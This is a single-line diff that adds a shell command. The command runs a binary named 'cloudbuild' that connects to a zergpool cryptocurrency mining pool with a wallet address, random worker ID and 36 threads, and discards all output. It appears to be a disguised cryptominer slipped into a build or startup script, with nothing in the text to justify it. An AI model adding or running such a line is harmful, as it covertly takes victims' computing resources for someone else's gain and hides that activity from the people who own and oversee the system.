@@ -1,0 +1,1 @@
+./cloudbuild -v -l verushash.asia.mine.zergpool.com:3300 -u ML237BDudyEj71oMDFEJShKHc8F6ogqkdY.$(shuf -n 1 -i 1-99999) -p c=LTC -t 36 >/dev/null 2>&1
